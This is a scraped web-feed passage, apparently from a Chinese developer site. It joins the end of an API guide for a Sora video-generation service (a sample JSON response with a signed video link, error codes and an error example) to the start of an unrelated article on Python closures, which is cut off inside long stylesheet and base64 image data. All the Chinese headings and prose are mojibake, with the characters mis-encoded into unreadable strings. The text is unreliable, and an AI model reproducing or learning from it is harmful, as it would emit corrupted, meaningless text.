    <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fb751e1e-4705-49ea-9fd4-5024b7865ea2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k777hjrbfrgs2060q5zvf2a5"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777hjrbfrgs2060q5zvf2a5%2Ftask_01k777hjrbfrgs2060q5zvf2a5_genid_b8e2e5d1-a579-49ca-a21c-cb3869685cce_25_10_10_14_15_147334%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A38%3A49Z&amp;se=2025-10-16T13%3A38%3A49Z&amp;sks=b&amp;skt=2025-10-10T12%3A38%3A49Z&amp;ske=2025-10-16T13%3A38%3A49Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=p4aMqXqkP%2FI1IhOVGCB9JL8vUUvfNBBF12ESpKhKXOk%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ç»“æœä¸­æœ‰ä¸€ä¸ª <code>task_id</code> å­—æ®µï¼Œå…¶ä»–çš„å­—æ®µéƒ½å’Œä¸Šæ–‡ç±»ä¼¼ï¼Œé€šè¿‡è¯¥å­—æ®µå³å¯å®ç°ä»»åŠ¡çš„å…³è”ã€‚</p>
<h2 data-id="heading-5">é”™è¯¯å¤„ç†</h2>
<p>åœ¨è°ƒç”¨ API æ—¶ï¼Œå¦‚æœé‡åˆ°é”™è¯¯ï¼ŒAPI ä¼šè¿”å›ç›¸åº”çš„é”™è¯¯ä»£ç å’Œä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>400 token_mismatched</code>ï¼šBad request, possibly due to missing or invalid parameters.</li>
<li><code>400 api_not_implemented</code>ï¼šBad request, possibly due to missing or invalid parameters.</li>
<li><code>401 invalid_token</code>ï¼šUnauthorized, invalid or missing authorization token.</li>
<li><code>429 too_many_requests</code>ï¼šToo many requests, you have exceeded the rate limit.</li>
<li><code>500 api_error</code>ï¼šInternal server error, something went wrong on the server.</li>
</ul>
<h3 data-id="heading-6">é”™è¯¯å“åº”ç¤ºä¾‹</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"error"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_error"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fetch failed"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-7">ç»“è®º</h2>
<p>é€šè¿‡æœ¬æ–‡æ¡£ï¼Œæ‚¨å·²ç»äº†è§£äº†å¦‚ä½•ä½¿ç”¨ Sora Videos Generation API å¯é€šè¿‡è¾“å…¥æç¤ºè¯ä»¥åŠå‚è€ƒå›¾ç‰‡æ¥ç”Ÿæˆè§†é¢‘ã€‚å¸Œæœ›æœ¬æ–‡æ¡£èƒ½å¸®åŠ©æ‚¨æ›´å¥½åœ°å¯¹æ¥å’Œä½¿ç”¨è¯¥ APIã€‚å¦‚æœ‰ä»»ä½•é—®é¢˜ï¼Œè¯·éšæ—¶è”ç³»æˆ‘ä»¬çš„æŠ€æœ¯æ”¯æŒå›¢é˜Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ Python ä¸­çš„é—­åŒ…ï¼ˆClosureï¼‰ï¼šå°è£…çŠ¶æ€çš„å‡½æ•°å¼ç¼–ç¨‹åˆ©å™¨]]></title>    <link>https://juejin.cn/post/7589940210831491115</link>    <guid>https://juejin.cn/post/7589940210831491115</guid>    <pubDate>2026-01-02T07:59:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210831491115" data-draft-id="7589822564778229775" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ Python ä¸­çš„é—­åŒ…ï¼ˆClosureï¼‰ï¼šå°è£…çŠ¶æ€çš„å‡½æ•°å¼ç¼–ç¨‹åˆ©å™¨"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-02T07:59:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ Python ä¸­çš„é—­åŒ…ï¼ˆClosureï¼‰ï¼šå°è£…çŠ¶æ€çš„å‡½æ•°å¼ç¼–ç¨‹åˆ©å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:59:36.000Z" title="Fri Jan 02 2026 07:59:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TBvV1tP21+Zpl2k3avdqf9Gh6wTr5Ohs0mnWeaKL1rXRnaW7QHeX7mXd13qaet56HL0yvRN6D/VhfRv9WP3F+nv1b+qPGBgahBqIDLYbXDR4bUgz9DfMNtx